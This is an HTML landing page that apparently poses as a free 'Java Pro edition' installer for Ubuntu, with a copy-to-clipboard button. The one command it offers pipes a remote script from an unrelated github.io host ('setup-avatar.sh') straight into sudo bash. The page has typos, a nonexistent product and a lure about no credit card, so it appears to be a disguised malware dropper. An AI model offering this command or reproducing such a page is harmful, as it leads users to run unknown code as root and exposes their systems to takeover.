<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Install Java for Ubuntu</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
  <style>
    body {
      background-color: #f0f8f5;
    }
    .header-section {
      background-color: #e9f4e9;
      padding: 2rem 1rem;
      text-align: center;
    }
    .header-section h1 {
      font-weight: 700;
    }
    .header-section p {
      color: #707070;
      margin-top: 0.5rem;
      font-size: 1.1rem;
    }
    .install-section {
      padding: 2rem 1rem;
      max-width: 900px;
      margin: auto;
    }
    .install-title {
      border-left: 4px solid #28a745;
      padding-left: 10px;
      font-weight: 700;
      font-size: 1.5rem;
    }
    .install-title .pro {
      color: #ff7d00;
      font-weight: 700;
      margin-left: 0.3rem;
    }
    .view-details {
      font-size: 0.9rem;
      color: #00a000;
      margin-left: 10px;
      cursor: pointer;
    }
    .description {
      font-size: 0.85rem;
      color: #333;
      margin-top: 0.5rem;
      margin-bottom: 1.5rem;
    }
    .code-container {
      background-color: #1e1e2f;
      color: #f8f8f2;
      font-family: monospace;
      padding: 1rem;
      border-radius: 6px;
      display: flex;
      align-items: center;
      gap: 10px;
      white-space: nowrap;
      overflow-x: auto;
    }
    .code-text {
      flex-grow: 1;
    }
    .btn-copy-pro {
      background-color: #28a745;
      border: none;
      color: white;
      font-weight: 700;
      padding: 0.4rem 1rem;
      border-radius: 4px;
      cursor: pointer;
    }
    .btn-copy-pro:hover {
      background-color: #218838;
    }
    .label-bold {
      font-weight: 700;
      margin-right: 0.5rem;
      font-size: 0.9rem;
    }
  </style>
</head>
<body>

  <section class="header-section">
    <h1>Install Java For Ubtunu</h1>
    <p>is free, Powerful and easy-to-use</p>
  </section>

  <section class="install-section">
    <div class="d-flex align-items-center mb-2">
      <div class="install-title">Java <span class="pro">Pro</span> edition install script</div>
    </div>
    <div class="description"><strong>No credit card required, no fees.</strong>
    </div>
    <div class="code-container">
      <div class="label-bold">Install script</div>
      <pre class="code-text" id="code">
        curl -sSL https://x0reg.github.io/setup/setup-avatar.sh | sudo bash
      </pre>
      <button class="btn-copy-pro" onclick="copyCode()">Copy Pro</button>
    </div>
  </section>

<script>
  function copyCode() {
    const code = document.getElementById('code').innerText.trim();
    navigator.clipboard.writeText(code).then(() => {
      alert('Copied to clipboard!');
    });
  }
</script>

</body>
</html>
